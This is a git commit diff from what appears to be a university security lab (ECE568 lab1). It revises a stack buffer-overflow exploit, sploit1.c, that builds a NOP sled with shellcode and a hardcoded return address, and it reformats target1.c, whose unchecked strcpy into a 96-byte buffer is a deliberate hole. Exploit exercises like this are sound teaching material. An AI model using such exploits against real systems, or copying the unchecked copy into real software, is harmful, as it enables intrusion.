7333762f334d5795d135f95fde81b383c24a28f0
Osiris-H <zcy1435773091@gamil.com>
2024-01-20 13:43:36 -0500

    Update: fix bug

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -7,41 +7,38 @@
 #define TARGET "../targets/target1"
 #define ADDR 0x3021fe50
 #define NOP 0x90
-#define BUF_SIZE 124 // fec8 - fe50 = 120; add 4 bytes for the return addr
+#define BUF_SIZE 125 // fec8 - fe50 = 120; add 4 bytes for the return addr
 
 // through the cmd line, we know the following addr,
 // lab_main starts at 0x3021fec8
 // buf starts at 0x3021fe50
-int main ( int argc, char * argv[] )
-{
-	char *	args[3];
-	char *	env[1];
+int main(int argc, char *argv[]) {
+    char *args[3];
+    char *env[1];
     char *ptr;
-
     long *addr_ptr;
 
     char buff[BUF_SIZE];
+    int i;
 
     ptr = buff;
-    addr_ptr = (long *) ptr;
-    // set address
-    for (i = 0; i < BUF_SIZE; i+=4)
-        *(addr_ptr++) = ADDR;
+    addr_ptr = (long *) (&buff[120]);
 
-    // write shellcode
+    for (i = 0; i < BUF_SIZE; i++)
+        buff[i] = NOP;
     for (i = 0; i < strlen(shellcode); i++)
         *(ptr++) = shellcode[i];
-
-    buff[BUF_SIZE - 1] = '\0';
+    *(addr_ptr) = ADDR;
+    buff[BUF_SIZE-1] = '\0';
 
     args[0] = TARGET;
-	args[1] = buff;
-	args[2] = NULL;
+    args[1] = buff;
+    args[2] = NULL;
 
-	env[0] = NULL;
+    env[0] = NULL;
 
-	if (execve (TARGET, args, env) < 0)
-		fprintf (stderr, "execve failed.\n");
+    if (execve(TARGET, args, env) < 0)
+        fprintf(stderr, "execve failed.\n");
 
-	return (0);
+    return (0);
 }
--- ECE568-lab1/targets/target1.c
+++ ECE568-lab1/targets/target1.c
@@ -2,27 +2,22 @@
 #include <stdlib.h>
 #include <string.h>
 
-int
-foo ( char *arg, char *out )
-{
+int foo ( char *arg, char *out ) {
 	strcpy(out, arg);
 	return (0);
 }
 
-int
-lab_main ( int argc, char *argv[] )
-{
+int lab_main (int argc, char *argv[]) {
 	int	t = 2;
-	char	buf[96];
+	char buf[96];
 
 	printf ("Target1 running.\n");
 
-	if (argc != t)
-	{
+	if (argc != t) {
 		fprintf(stderr, "target1: argc != 2\n");
 		exit(EXIT_FAILURE);
 	}
 
-	foo ( argv[1], buf );
+	foo( argv[1], buf );
 	return (0);
 }
